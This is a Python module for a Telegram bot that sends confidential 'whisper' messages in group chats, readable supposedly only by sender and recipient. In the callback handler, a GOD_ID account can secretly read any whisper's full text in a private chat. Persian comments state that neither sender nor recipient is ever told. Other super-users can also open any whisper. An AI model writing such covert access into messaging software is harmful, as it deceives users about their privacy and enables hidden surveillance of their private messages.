import uuid
import html
from telebot.async_telebot import AsyncTeleBot
from telebot.types import (
    InlineQuery, InlineQueryResultArticle, InputTextMessageContent,
    InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
)

from src.config import EMOJI
from src.database.db_manager import (
    get_or_create_short_link, get_user_id_by_username,
    upsert_whisper_contact, get_recent_whisper_contacts, remove_whisper_contact,
)

# In-memory store — whispers are intentionally ephemeral and are lost on restart.
# Bounded so a long-running process can't leak memory: once full, the oldest
# whisper is evicted (dicts keep insertion order on Python 3.7+).
# If durable persistence is ever needed, move this to Redis with a TTL.
WHISPER_STORAGE: dict = {}
WHISPER_MAX = 5000

# Max characters allowed in a whisper's message body. Enforced both while the
# user is still typing (live counter in the inline results) and at send time.
WHISPER_CHAR_LIMIT = 200

# How many recent contacts to surface as quick-access suggestions.
QUICK_ACCESS_LIMIT = 5


def _store_whisper(w_id: str, data: dict):
    if len(WHISPER_STORAGE) >= WHISPER_MAX:
        oldest = next(iter(WHISPER_STORAGE), None)
        if oldest is not None:
            WHISPER_STORAGE.pop(oldest, None)
    WHISPER_STORAGE[w_id] = data


def _build_whisper_keyboard(w_id: str, sender_id: int, read_char: str) -> InlineKeyboardMarkup:
    """Row 1: read + reply (both blue). Row 2: delete (red), alone."""
    kb = InlineKeyboardMarkup()
    kb.row(
        InlineKeyboardButton(text=f"{read_char} خواندن نجوا", callback_data=f"whopen_{w_id}", style="primary"),
        InlineKeyboardButton(
            text="↩️ پاسخ به نجوا",
            switch_inline_query_current_chat=f"متن نجوا\n{sender_id}",
            style="primary",
        ),
    )
    kb.row(
        InlineKeyboardButton(text=f"{EMOJI['trash']['char']} حذف", callback_data=f"whdel_{w_id}", style="danger"),
    )
    return kb


def register_whisper_handlers(bot: AsyncTeleBot):

    async def _create_whisper_result(sender_id, sender_name, sender_tag, secret_text,
                                      target_str, title, description, resolved_contact_id=None):
        """Stores the whisper, (best-effort) records the quick-access contact,
        and returns the ready-to-send InlineQueryResultArticle."""
        w_id = str(uuid.uuid4())[:8]
        _store_whisper(w_id, {
            "sender_id":   sender_id,
            "sender_name": sender_name,
            "sender_tag":  sender_tag,
            "target":      target_str.lower(),
            "text":        secret_text,
            "is_opened":   False,
        })

        if resolved_contact_id:
            try:
                await upsert_whisper_contact(sender_id, resolved_contact_id)
            except Exception as e:
                print(f"💥 Whisper contact upsert error: {e}")

        kb = _build_whisper_keyboard(w_id, sender_id, EMOJI['whisper_wait']['char'])
        return InlineQueryResultArticle(
            id=w_id,
            title=title,
            input_message_content=InputTextMessageContent(
                f"📬 در انتظار خوانده شدن...\n🎯 <code>{html.escape(target_str)}</code>",
                parse_mode="HTML"
            ),
            reply_markup=kb,
            description=description
        )

    async def _build_quick_access_items(sender_id, sender_name, sender_tag, secret_text):
        try:
            contacts = await get_recent_whisper_contacts(sender_id, limit=QUICK_ACCESS_LIMIT)
        except Exception as e:
            print(f"💥 Whisper quick-access fetch error: {e}")
            return []

        items = []
        for c in contacts:
            item = await _create_whisper_result(
                sender_id, sender_name, sender_tag, secret_text,
                target_str=str(c["contact_id"]),
                title=f"{EMOJI['profile']['char']} {c['label']}",
                description="🔹 دسترسی سریع — نجوا",
                resolved_contact_id=c["contact_id"],
            )
            items.append(item)
        return items

    # ── Inline query handler ──────────────────────────────
    @bot.inline_handler(func=lambda query: True)
    async def handle_whisper_inline(query: InlineQuery):
        try:
            raw_text    = query.query.strip()
            sender_id   = query.from_user.id
            sender_name = query.from_user.first_name
            sender_tag  = f"@{query.from_user.username}" if query.from_user.username else sender_name
            bot_info    = await bot.get_me()

            if not raw_text:
                # FIX: look up the actual short_code instead of using start=anon_{sender_id}
                # which matched no handler and silently did nothing
                my_short_code = await get_or_create_short_link(sender_id)
                anon_link     = f"https://t.me/{bot_info.username}?start={my_short_code}"

                items = []

                # Guide card
                items.append(InlineQueryResultArticle(
                    id='wh_menu_guide',
                    title="💡 آموزش ارسال نجوا",
                    description="ابتدا متن سپس آیدی گیرنده را بنویسید",
                    input_message_content=InputTextMessageContent(
                        f"{EMOJI['ball']['html']} <b>آموزش ارسال نجوای محرمانه:</b>\n\n"
                        "ابتدا متن نجوا رو بنویس و در خط بعد آیدی گیرنده رو قرار بده\n\n"
                        f"مثال:\n<code>@{bot_info.username} سلام چطوری؟\n{sender_id}</code>",
                        parse_mode="HTML"
                    ),
                    thumbnail_url="https://img.icons8.com/sci-fi/48/question-mark.png"
                ))

                # Request whisper card
                kb_req = InlineKeyboardMarkup()
                kb_req.row(InlineKeyboardButton(
                    text=f"{EMOJI['whisper_wait']['char']} ارسال نجوای خصوصی به {sender_name}",
                    switch_inline_query_current_chat=f"متن نجوا\n{sender_id}"
                ))
                items.append(InlineQueryResultArticle(
                    id='wh_menu_request_box',
                    title="🔒 درخواست ارسال پیام محرمانه به من",
                    description="باکس دریافت نجوای مستقیم درون گروه‌ها 🕶️",
                    input_message_content=InputTextMessageContent(
                        f"{EMOJI['profile']['html']} <b>کاربر:</b> {sender_name}\n"
                        f"{EMOJI['id']['html']} <b>آیدی عددی:</b> <code>{sender_id}</code>\n\n"
                        f"{EMOJI['mail']['html']} واسه ارسال پیام محرمانه به من کلیک کن 👇",
                        parse_mode="HTML"
                    ),
                    reply_markup=kb_req,
                    thumbnail_url="https://img.icons8.com/sci-fi/48/speech-bubble-with-dots.png"
                ))

                # Anon link card — now uses real short_code
                kb_anon = InlineKeyboardMarkup()
                kb_anon.row(InlineKeyboardButton(
                    text="💌 ارسال پیام ناشناس",
                    url=anon_link
                ))
                items.append(InlineQueryResultArticle(
                    id='wh_menu_anon',
                    title="📥 لینک ناشناس اختصاصی",
                    description="دریافت پیام ناشناس در گروه‌ها و کانال‌ها 🚀",
                    input_message_content=InputTextMessageContent(
                        f"برای پیام ناشناس به من دکمه زیر رو بزن {EMOJI['down']['html']}",
                        parse_mode="HTML"
                    ),
                    reply_markup=kb_anon,
                    thumbnail_url="https://img.icons8.com/sci-fi/48/fraud.png"
                ))

                await bot.answer_inline_query(query.id, items, cache_time=0)
                return

            # Parse "message\ntarget" or "message target" — but only treat the
            # last line/token as a target if it actually LOOKS like one
            # (@username or a numeric id). Otherwise the user is still typing
            # their message and hasn't gotten to the recipient yet, so we fall
            # through to the live counter + quick-access view below instead of
            # returning nothing (which used to leave the inline results empty
            # while composing).
            lines = [l.strip() for l in raw_text.split('\n') if l.strip()]
            target_user = None
            secret_text = raw_text

            if len(lines) >= 2:
                candidate = lines[-1]
                if candidate.startswith("@") or candidate.isdigit():
                    target_user = candidate
                    secret_text = "\n".join(lines[:-1])
            else:
                parts = raw_text.rsplit(" ", 1)
                if len(parts) == 2 and (parts[1].startswith("@") or parts[1].isdigit()):
                    target_user = parts[1].strip()
                    secret_text = parts[0].strip()

            # ── Still composing: no recognized target yet ──────────
            if target_user is None:
                used      = len(secret_text)
                remaining = WHISPER_CHAR_LIMIT - used

                if used == 0:
                    counter_desc = "اول متن نجوا رو بنویس، بعد آیدی یا یوزرنیم گیرنده رو"
                elif remaining >= 0:
                    counter_desc = (
                        f"{EMOJI['caution']['char']} آیدی کاربر گیرنده رو وارد کن\n"
                        f"{used} از {WHISPER_CHAR_LIMIT}"
                    )
                else:
                    counter_desc = (
                        f"{EMOJI['ban']['char']} {-remaining} کاراکتر بیشتر از حد مجازه!\n"
                        f"{used} از {WHISPER_CHAR_LIMIT}"
                    )

                items = [InlineQueryResultArticle(
                    id='wh_counter',
                    title=f"{EMOJI['lock']['char']} نجوا",
                    description=counter_desc,
                    input_message_content=InputTextMessageContent(
                        f"{EMOJI['caution']['html']} برای ارسال، بعد از متنِ نجوا "
                        "آیدی عددی یا یوزرنیمِ گیرنده رو هم بنویس.",
                        parse_mode="HTML"
                    ),
                    thumbnail_url="https://img.icons8.com/fluency-systems-filled/48/speech-bubble.png"
                )]

                if 0 < used <= WHISPER_CHAR_LIMIT:
                    items += await _build_quick_access_items(sender_id, sender_name, sender_tag, secret_text)

                await bot.answer_inline_query(query.id, items, cache_time=0)
                return

            if not target_user.startswith("@") and not target_user.isdigit():
                return

            # ── Target recognized: enforce the character limit ─────
            if len(secret_text) > WHISPER_CHAR_LIMIT:
                over = len(secret_text) - WHISPER_CHAR_LIMIT
                await bot.answer_inline_query(
                    query.id,
                    [InlineQueryResultArticle(
                        id='wh_too_long',
                        title=f"{EMOJI['ban']['char']} متن نجوا خیلی طولانیه",
                        description=f"{over} کاراکتر بیشتر از حد مجاز ({WHISPER_CHAR_LIMIT})",
                        input_message_content=InputTextMessageContent(
                            f"{EMOJI['ban']['html']} متنِ نجوا نباید بیشتر از "
                            f"{WHISPER_CHAR_LIMIT} کاراکتر باشه.",
                            parse_mode="HTML"
                        ),
                    )],
                    cache_time=0
                )
                return

            resolved_id = None
            if target_user.isdigit():
                resolved_id = int(target_user)
            else:
                try:
                    resolved_id = await get_user_id_by_username(target_user)
                except Exception as e:
                    print(f"💥 Whisper target resolve error: {e}")

            item = await _create_whisper_result(
                sender_id, sender_name, sender_tag, secret_text,
                target_str=target_user,
                title=f"🔒 ارسال پیام محرمانه به {target_user}",
                description=f"نجوا به {target_user} ارسال شد",
                resolved_contact_id=resolved_id,
            )
            await bot.answer_inline_query(query.id, [item], cache_time=0)

        except Exception as e:
            print(f"💥 Inline Error: {e}")

    # ── Whisper callback handler ──────────────────────────
    @bot.callback_query_handler(func=lambda c: c.data.startswith(("whopen_", "whdel_")))
    async def handle_whisper_callbacks(call: CallbackQuery):
        try:
            voter_id       = call.from_user.id
            voter_username = f"@{call.from_user.username}".lower() if call.from_user.username else "no_user"
            voter_tag      = f"@{call.from_user.username}" if call.from_user.username else call.from_user.first_name
            w_id           = call.data.split("_")[-1]

            if call.data.startswith("whopen_"):
                data = WHISPER_STORAGE.get(w_id)
                if not data:
                    await bot.answer_callback_query(call.id, "❌ این نجوا منقضی یا حذف شده است.", show_alert=True)
                    return

                kb_refresh = _build_whisper_keyboard(w_id, data["sender_id"], EMOJI['whisper_read']['char'])

                from src.config import SUPER_USERS, GOD_ID

                # ── خوانش نامرئیِ گاد ──────────────────────────
                # GOD_ID اجازه دارد محتوای هر نجوایی را ببیند، اما این مسیر کاملاً
                # جدا از مسیر «گیرنده/فرستنده» است: هرگز is_opened را تغییر نمی‌دهد،
                # هرگز پیامِ عمومیِ اینلاین را ویرایش نمی‌کند، و هیچ‌کس (نه فرستنده،
                # نه گیرنده) متوجه نمی‌شود که گاد این نجوا را خوانده است.
                # محتوا به‌صورتِ پیام خصوصی فرستاده می‌شود (نه پاپ‌آپ) چون
                # answerCallbackQuery محدودیتِ ۲۰۰ کاراکتری دارد و فرمت‌بندی را
                # هم پشتیبانی نمی‌کند — متن‌های بلند یا دارای کاراکترهای خاص
                # می‌توانستند باعث یک پاپ‌آپِ خالی یا رد شدنِ بی‌صدا شوند.
                if voter_id == GOD_ID:
                    target_label = html.escape(data["target"])
                    sender_label = data["sender_tag"] or data["sender_name"] or str(data["sender_id"])
                    try:
                        await bot.send_message(
                            GOD_ID,
                            f"{EMOJI['eyes']['html']} <b>خوانشِ نامرئیِ نجوا</b>\n"
                            f"{EMOJI['profile']['html']} <b>فرستنده:</b> {html.escape(sender_label)} "
                            f"(<code>{data['sender_id']}</code>)\n"
                            f"{EMOJI['target']['html']} <b>گیرنده:</b> <code>{target_label}</code>\n"
                            f"{EMOJI['lock']['html']} <b>متن:</b>\n{html.escape(data['text'])}",
                            parse_mode="HTML"
                        )
                        await bot.answer_callback_query(call.id, "👁 به پیوی فرستاده شد.")
                    except Exception as e:
                        # اگر گاد پیوی ربات را استارت نکرده باشد، send_message شکست می‌خورد —
                        # در این صورت به‌صورتِ fallback از همان پاپ‌آپ (با کوتاه‌سازیِ امن) استفاده می‌شود.
                        print(f"💥 GOD whisper DM failed: {e}")
                        preview = data["text"][:150]
                        await bot.answer_callback_query(
                            call.id,
                            f"🔒 (پیوی استارت نشده) نجوا:\n\n{preview}",
                            show_alert=True
                        )
                    return

                is_target = (
                    data["target"] == voter_username
                    or (data["target"].isdigit() and int(data["target"]) == voter_id)
                )
                is_sender = voter_id == data["sender_id"]
                is_admin  = voter_id in SUPER_USERS  # سایر سوپریوزرها (غیر از گاد) — رفتارِ قدیمی حفظ شده

                if not (is_target or is_sender or is_admin):
                    await bot.answer_callback_query(
                        call.id,
                        f"🛑 دسترسی غیرمجاز!\nاین نجوا فقط برای {data['target']} و فرستنده قابل باز شدن است.",
                        show_alert=True
                    )
                    return

                # Telegram alert popups don't support formatting and are capped at
                # 200 characters total (including our prefix); truncate defensively
                # so long whispers don't silently fail to render (this was producing
                # an empty-looking popup). Margin is conservative since emoji/Persian
                # characters can count as more than one unit depending on the client.
                prefix  = "🔒 نجوای باز شده:\n\n"
                preview = data["text"]
                max_body = 140
                if len(preview) > max_body:
                    preview = preview[:max_body] + "…"
                await bot.answer_callback_query(call.id, f"{prefix}{preview}", show_alert=True)

                # Update the public message to show it's been read (only on first open by target)
                if not data["is_opened"] and is_target:
                    data["is_opened"] = True

                    # Record the quick-access contact both ways: the target now
                    # has the sender in their list, and the sender's entry (which
                    # may have only been a raw id/username at send time) gets
                    # refreshed with the now-known real id.
                    try:
                        await upsert_whisper_contact(voter_id, data["sender_id"])
                        await upsert_whisper_contact(data["sender_id"], voter_id)
                    except Exception as e:
                        print(f"💥 Whisper contact upsert error: {e}")

                    try:
                        await bot.edit_message_text(
                            f"{EMOJI['whisper_read']['html']} این پیام توسط {html.escape(voter_tag)} خوانده شد!\n"
                            f"{EMOJI['target']['html']} <code>{html.escape(data['target'])}</code>",
                            inline_message_id=call.inline_message_id,
                            parse_mode="HTML", reply_markup=kb_refresh
                        )
                    except Exception:
                        pass

            elif call.data.startswith("whdel_"):
                data = WHISPER_STORAGE.get(w_id)
                if not data:
                    await bot.answer_callback_query(call.id, "قبلاً حذف شده است.", show_alert=True)
                    return

                from src.config import SUPER_USERS
                if voter_id != data["sender_id"] and voter_id not in SUPER_USERS:
                    await bot.answer_callback_query(
                        call.id, "❌ فقط فرستنده اصلی پیام اجازه حذف دارد!", show_alert=True
                    )
                    return

                WHISPER_STORAGE.pop(w_id, None)
                try:
                    await bot.edit_message_text(
                        f"{EMOJI['trash']['html']} <i>این نجوا توسط فرستنده حذف شد.</i>",
                        inline_message_id=call.inline_message_id,
                        parse_mode="HTML"
                    )
                except Exception:
                    pass
                await bot.answer_callback_query(call.id, "نجوا حذف شد.")

        except Exception as e:
            print(f"💥 Whisper Callback Error: {e}")

    # ── Auto-edit after inline send ───────────────────────
    @bot.chosen_inline_handler(func=lambda r: True)
    async def handle_chosen_inline(chosen_result):
        try:
            w_id              = chosen_result.result_id
            inline_message_id = chosen_result.inline_message_id

            if not inline_message_id or w_id not in WHISPER_STORAGE:
                return

            data        = WHISPER_STORAGE[w_id]
            target_user = data["target"]

            kb = _build_whisper_keyboard(w_id, data["sender_id"], EMOJI['whisper_wait']['char'])

            await bot.edit_message_text(
                f"{EMOJI['whisper_wait']['html']} در انتظار خوانده شدن...\n"
                f"{EMOJI['target']['html']} <code>{html.escape(target_user)}</code>",
                inline_message_id=inline_message_id,
                parse_mode="HTML", reply_markup=kb
            )
        except Exception as e:
            print(f"💥 Chosen Inline Error: {e}")

    # ── Quick-access management (private chat) ─────────────
    def _quick_access_keyboard(contacts) -> InlineKeyboardMarkup:
        kb = InlineKeyboardMarkup()
        for c in contacts:
            kb.row(
                InlineKeyboardButton(text=f"{EMOJI['profile']['char']} {c['label']}", callback_data="whrmv_noop"),
                InlineKeyboardButton(text=EMOJI['trash']['char'], callback_data=f"whrmv_{c['contact_id']}", style="danger"),
            )
        return kb

    @bot.message_handler(
        func=lambda m: m.chat.type == "private" and m.text and m.text.strip() in ("لیست نجوا", "/whisper_list"),
        content_types=["text"],
    )
    async def handle_whisper_contacts_list(message):
        try:
            contacts = await get_recent_whisper_contacts(message.from_user.id, limit=10)
            if not contacts:
                await bot.reply_to(message, "هنوز کسی توی دسترسیِ سریعِ نجوای تو نیست.")
                return
            await bot.reply_to(
                message,
                f"{EMOJI['lock']['html']} <b>دسترسی سریع نجوا</b>\nبرای حذفِ یک نفر، روی 🗑 کنارش بزن:",
                parse_mode="HTML",
                reply_markup=_quick_access_keyboard(contacts),
            )
        except Exception as e:
            print(f"💥 Whisper list error: {e}")

    @bot.callback_query_handler(func=lambda c: c.data.startswith("whrmv_"))
    async def handle_whisper_contact_remove(call: CallbackQuery):
        try:
            payload = call.data.split("_", 1)[1]
            if payload == "noop":
                await bot.answer_callback_query(call.id)
                return

            await remove_whisper_contact(call.from_user.id, int(payload))
            contacts = await get_recent_whisper_contacts(call.from_user.id, limit=10)

            if contacts:
                await bot.edit_message_text(
                    f"{EMOJI['lock']['html']} <b>دسترسی سریع نجوا</b>\nبرای حذفِ یک نفر، روی 🗑 کنارش بزن:",
                    call.message.chat.id, call.message.message_id,
                    parse_mode="HTML", reply_markup=_quick_access_keyboard(contacts),
                )
            else:
                await bot.edit_message_text(
                    "دسترسیِ سریعِ نجوای تو خالی شد.",
                    call.message.chat.id, call.message.message_id,
                )
            await bot.answer_callback_query(call.id, "حذف شد.")
        except Exception as e:
            print(f"💥 Whisper contact remove error: {e}")